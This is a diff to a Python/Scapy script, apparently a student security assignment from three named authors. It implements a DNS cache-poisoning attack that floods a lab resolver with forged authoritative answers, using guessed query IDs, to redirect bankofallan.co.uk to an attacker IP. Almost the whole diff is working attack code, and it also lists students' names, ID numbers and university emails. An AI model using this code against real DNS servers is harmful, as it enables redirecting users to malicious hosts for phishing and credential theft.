@@ -5,12 +5,12 @@
 This script makes
 
 """
-__author__ = "Andrea Lacava (1663286), Matteo Attenni (), Ilaria Clemente ()"
+__author__ = "Andrea Lacava (1663286), Matteo Attenni (), Ilaria Clemente (1836039)"
 __credits__ = ["Andrea Lacava", "Matteo Attenni", "Ilaria Clemente"]
 __license__ = "GPL"
 __version__ = "1.0"
-__email__ = "lacava.1663286@studenti.uniroma1.it, @studenti.uniroma1.it, " \
-            "@studenti.uniroma1.it"
+__email__ = "lacava.1663286@studenti.uniroma1.it, attenni.XXXXX@studenti.uniroma1.it, " \
+            "clemente.1836039@studenti.uniroma1.it"
 __status__ = "Production"
 
 import sys
@@ -33,11 +33,11 @@ TARGET_PORT_REQUEST = 53  # target port for first vulnDNS's IP request
 BAD_DNS_SERVER_IP = "192.168.56.1"  # DNS endpoint IP of badguy.ru (also present on config.json)
 BAD_DNS_SERVER_PORT = 55553  # DNS endpoint port of badguy.ru (also present on config.json)
 
-SPOOFED_DNS = "192.168.56.100"
+SPOOFED_DNS = "10.0.0.1"
 URL_TO_POISON = "bankofallan.co.uk"
 DNS_URL_BADGUY = "badguy.ru"
 
-PACKET_SIZE = 500  # number of packets
+PACKET_SIZE = 1000  # number of packets
 
 
 # get current time in milliseconds
@@ -71,33 +71,46 @@ def dns_server_routine():
             break
 
 
+def randomize_url(seed):
+    # current_milli_time()
+    return chr((seed % 256) + 15) + "."
+
+
 def bite_the_rat(target_port_sniffed):
     """
     Attack function.
 
 
     """
-    for i in range(PACKET_SIZE):
-        random_url = URL_TO_POISON
-        dns_req = IP(dst=TARGET_IP) / UDP(dport=TARGET_PORT_REQUEST) / DNS(rd=1,  # recursion desired
-                                                                           qd=DNSQR(qname=random_url))
 
+    random_url = "www." + URL_TO_POISON
+    dns_req = IP(dst=TARGET_IP) / UDP(dport=TARGET_PORT_REQUEST) / DNS(rd=1, qd=DNSQR(qname=random_url))
+    send(dns_req, verbose=0)
+
+    for i in range(PACKET_SIZE):
         # since we've to guess the query id we define a time-based pseudo random generator
         query_id = current_milli_time() % 65536  # 16 bit maximum delimiter of query_id's DNS field
-        packet = IP(src=SPOOFED_DNS, dst=TARGET_IP) / UDP(dport=target_port_sniffed) / DNS(id=query_id,
-                                                                                           qr=1,
-                                                                                           an=None,
-                                                                                           qd=DNSQR(
-                                                                                               qname=DNS_URL_BADGUY,
-                                                                                               qtype="A"),
-                                                                                           ar=(DNSRR(
-                                                                                               rrname='ns.bankofallan.com',
-                                                                                               type="A", ttl=60000,
-                                                                                               rdata='192.168.56.1')))
-        print(BITE_THE_RAT_HEADER + "request sent")
-        print(BITE_THE_RAT_HEADER + "Bite the RaT")
-        send(dns_req, verbose=0)
-        send(packet, verbose=0)
+        res_packet = IP(src=SPOOFED_DNS, dst=TARGET_IP) / UDP(dport=target_port_sniffed) / DNS(id=query_id,
+                                                                                               qr=1,
+                                                                                               aa=1,
+                                                                                               ra=0,
+                                                                                               rcode=0,
+                                                                                               qd=DNSQR(
+                                                                                                   qname=random_url,
+                                                                                                   qtype="A"),
+                                                                                               an=(DNSRR(
+                                                                                                   rrname=random_url + ".",
+                                                                                                   type="A", ttl=60000,
+                                                                                                   rdata='192.168.56.1'))
+                                                                                               )
+
+        print(BITE_THE_RAT_HEADER + "Response number " + str(i) + ", queryid: " + str(
+            query_id) + ", random_url= \"" + random_url + "\" ")
+        send(res_packet, verbose=0)
+
+    print("Attack terminated exiting")
+
+    # DNSRR(rrname='ns.bankofallan.com', type="A", ttl=60000, rdata='192.168.56.1')
 
 
 UDP_IP = "192.168.56.1"
